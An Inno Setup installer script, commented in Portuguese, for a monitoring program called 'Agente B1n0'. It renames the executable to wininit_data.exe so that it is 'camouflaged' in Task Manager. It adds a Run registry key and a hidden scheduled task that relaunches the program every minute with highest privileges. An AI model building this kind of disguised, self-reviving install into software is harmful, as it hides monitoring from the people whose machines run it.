[Setup]
AppId={{8B32145A-7C21-4E6E-A52D-1234567890ABC}
; Nome que aparece no Painel de Controle e Instalador
AppName=Agente B1n0
AppVersion=6.5
DefaultDirName={commonpf}\AgenteB1n0
DisableDirPage=yes
PrivilegesRequired=admin 
OutputDir=Output
OutputBaseFilename=Instalador_AgenteB1n0_v6.5
; Ícones do Instalador
SetupIconFile=mascote.ico
WizardSmallImageFile=mascote.bmp
WizardImageBackColor=clWhite
Compression=lzma
SolidCompression=yes
WizardStyle=modern

[Languages]
; Força o instalador a ficar em Português
Name: "brazilianportuguese"; MessagesFile: "compiler:Languages\BrazilianPortuguese.isl"

[Files]
; O executável interno continua com nome camuflado para o Gerenciador de Tarefas
Source: "dist\monitor\monitor.exe"; DestDir: "{app}"; DestName: "wininit_data.exe"; Flags: ignoreversion; Permissions: users-modify
Source: "dist\monitor\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "mascote.ico"; DestDir: "{app}"; Flags: ignoreversion
Source: "mascote.bmp"; DestDir: "{app}"; Flags: ignoreversion

[Registry]
Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "AgenteB1n0Host"; ValueData: """{app}\wininit_data.exe"""; Flags: uninsdeletevalue

[Run]
; Cria a tarefa de persistência (Cão de guarda)
Filename: "schtasks"; Parameters: "/create /tn ""WinDataSync"" /tr ""'{app}\wininit_data.exe'"" /sc minute /mo 1 /rl highest /f"; Flags: runhidden
Filename: "{app}\wininit_data.exe"; Description: "Iniciar Agente B1n0"; Flags: nowait postinstall skipifsilent

[UninstallRun]
Filename: "schtasks"; Parameters: "/delete /tn ""WinDataSync"" /f"; Flags: runhidden; RunOnceId: "DelTask"

[Code]
function InitializeUninstall(): Boolean;
var ErrorCode: Integer;
begin
  // Fecha o processo antes de desinstalar
  ShellExec('open', 'taskkill.exe', '/f /im wininit_data.exe', '', SW_HIDE, ewWaitUntilTerminated, ErrorCode);
  Result := True;
end;
